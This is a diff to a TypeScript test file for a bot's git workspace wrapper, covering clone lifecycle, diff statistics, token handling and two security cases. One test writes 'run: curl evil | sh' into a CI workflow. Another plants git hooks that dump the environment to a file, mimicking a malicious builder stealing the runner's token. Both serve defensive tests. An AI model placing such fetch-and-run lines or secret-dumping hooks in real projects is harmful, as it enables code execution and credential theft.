@@ -1,52 +1,100 @@
 import assert from "node:assert/strict";
 import { execFileSync } from "node:child_process";
-import { mkdtempSync, writeFileSync, existsSync } from "node:fs";
+import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import path from "node:path";
 import { test } from "node:test";
 import { Repo } from "./git.js";
+import { setGitIdentity } from "./proc.js";
 
+const identity = { GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" };
 function git(cwd: string, ...args: string[]): string {
-  return execFileSync("git", args, { cwd, encoding: "utf8", env: { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" } }).trim();
+  return execFileSync("git", args, { cwd, encoding: "utf8", env: { ...process.env, ...identity } }).trim();
 }
 
-test("worktree lifecycle against a real repository", async () => {
+function fixture() {
   const root = mkdtempSync(path.join(tmpdir(), "isobot-git-"));
   const origin = path.join(root, "origin.git");
   const seed = path.join(root, "seed");
-  execFileSync("git", ["init", "--bare", "-b", "main", origin]);
-  execFileSync("git", ["clone", origin, seed]);
+  execFileSync("git", ["init", "-q", "--bare", "-b", "main", origin]);
+  execFileSync("git", ["clone", "-q", origin, seed]);
+  mkdirSync(path.join(seed, "ci"));
   writeFileSync(path.join(seed, "README.md"), "hello\n");
+  writeFileSync(path.join(seed, "ci", "deploy.yml"), "run: echo deploy\n");
   git(seed, "add", "-A");
-  git(seed, "commit", "-m", "init");
-  git(seed, "push", "origin", "HEAD:main");
-
-  process.env.GIT_AUTHOR_NAME = process.env.GIT_COMMITTER_NAME = "isobot test";
-  process.env.GIT_AUTHOR_EMAIL = process.env.GIT_COMMITTER_EMAIL = "test@example.com";
+  git(seed, "commit", "-q", "-m", "init");
+  git(seed, "push", "-q", "origin", "HEAD:main");
+  setGitIdentity("isobot test", "test@example.com");
   const repo = new Repo(path.join(root, "home"), "o", "r", "secret-token", origin);
-  await repo.sync("main");
-  const dir = await repo.createWorktree("isobot/1-test", "main");
+  return { root, origin, repo };
+}
+
+test("workspace lifecycle: build in a throwaway clone, judge and push from the runner's clone", async () => {
+  const { origin, repo } = fixture();
+  const base = await repo.sync("main");
+  assert.equal(base, git(origin, "rev-parse", "main"));
+  const dir = await repo.createWorkspace("isobot/1-test", base);
   assert.ok(existsSync(path.join(dir, "README.md")));
-  assert.equal(await repo.commitPending(dir, "nothing", "main"), false);
+  assert.equal(git(dir, "branch", "--show-current"), "isobot/1-test");
+
+  await repo.commitPending(dir, "nothing");
+  assert.equal(await repo.ahead(base, await repo.capture(dir, "isobot/1-test")), 0);
 
   writeFileSync(path.join(dir, "feature.txt"), "a\nb\n");
-  assert.equal(await repo.commitPending(dir, "add feature", "main"), true);
-  const stat = await repo.diffStat(dir, "main");
-  assert.deepEqual(stat, { files: [{ path: "feature.txt", added: 2, removed: 0 }], changedLines: 2 });
-  assert.match(await repo.diff(dir, "main"), /\+a\n\+b/);
+  writeFileSync(path.join(dir, "logo.png"), Buffer.from([0x89, 0x50, 0x4e, 0x47, 0, 1, 2, 0, 3]));
+  await repo.commitPending(dir, "add feature");
+  const sha = await repo.capture(dir, "isobot/1-test");
+  assert.equal(await repo.ahead(base, sha), 1);
+  const stat = await repo.diffStat(base, sha);
+  assert.deepEqual(stat.files.map(f => [f.path, f.binary]), [["feature.txt", false], ["logo.png", true]]);
+  assert.equal(stat.changedLines, 2 + 100, "binary files weigh 100 lines");
+  assert.match(await repo.diff(base, sha), /\+a\n\+b/);
 
-  await repo.push(dir, "isobot/1-test");
-  assert.equal(git(origin, "rev-parse", "isobot/1-test"), await repo.head(dir));
-  assert.ok(!git(repo.clonePath, "config", "--list").includes("secret-token"), "token never lands in git config");
+  await repo.push(sha, "isobot/1-test");
+  assert.equal(git(origin, "rev-parse", "isobot/1-test"), sha);
+  assert.ok(!readFileSync(path.join(repo.barePath, "config"), "utf8").includes("secret-token"), "token never lands in git config");
 
-  // Re-creating the worktree for a retry starts clean from the default branch.
-  const again = await repo.createWorktree("isobot/1-test", "main");
+  // A retry starts clean from the base commit.
+  const again = await repo.createWorkspace("isobot/1-test", base);
   assert.ok(!existsSync(path.join(again, "feature.txt")));
-  await repo.removeWorktree("isobot/1-test");
+  await repo.removeWorkspace("isobot/1-test");
   assert.ok(!existsSync(again));
 
-  const release = await repo.checkoutAt(git(origin, "rev-parse", "main"), "1-merge");
+  const release = await repo.checkoutAt(base, "release__1-merge");
   assert.ok(existsSync(path.join(release, "README.md")));
-  await repo.removeWorktree("release__1-merge");
+  await repo.removeWorkspace("release__1-merge");
   assert.ok(!existsSync(release));
+});
+
+test("a rename into a protected folder shows the real destination path", async () => {
+  const { repo } = fixture();
+  const base = await repo.sync("main");
+  const dir = await repo.createWorkspace("isobot/2-rename", base);
+  mkdirSync(path.join(dir, ".github", "workflows"), { recursive: true });
+  git(dir, "mv", "ci/deploy.yml", ".github/workflows/deploy.yml");
+  writeFileSync(path.join(dir, ".github", "workflows", "deploy.yml"), "run: curl evil | sh\n");
+  await repo.commitPending(dir, "move ci");
+  const stat = await repo.diffStat(base, await repo.capture(dir, "isobot/2-rename"));
+  assert.deepEqual(stat.files.map(f => f.path).sort(), [".github/workflows/deploy.yml", "ci/deploy.yml"]);
+});
+
+test("hooks a builder plants never run with the runner's token", async () => {
+  const { root, repo } = fixture();
+  const base = await repo.sync("main");
+  const dir = await repo.createWorkspace("isobot/3-hook", base);
+  const leak = path.join(root, "leaked.txt");
+  // A malicious builder plants hooks in its workspace and tries to add one to the runner's clone.
+  for (const hooks of [path.join(dir, ".git", "hooks"), path.join(repo.barePath, "hooks")]) {
+    mkdirSync(hooks, { recursive: true });
+    for (const name of ["pre-push", "reference-transaction", "post-checkout", "pre-commit"]) {
+      writeFileSync(path.join(hooks, name), `#!/bin/sh\nenv >> "${leak}"\n`);
+      chmodSync(path.join(hooks, name), 0o755);
+    }
+  }
+  writeFileSync(path.join(dir, "x.txt"), "x\n");
+  await repo.commitPending(dir, "x");
+  const sha = await repo.capture(dir, "isobot/3-hook");
+  await repo.push(sha, "isobot/3-hook");
+  await repo.sync("main");
+  assert.ok(!existsSync(leak), "no hook ran during runner git operations");
 });
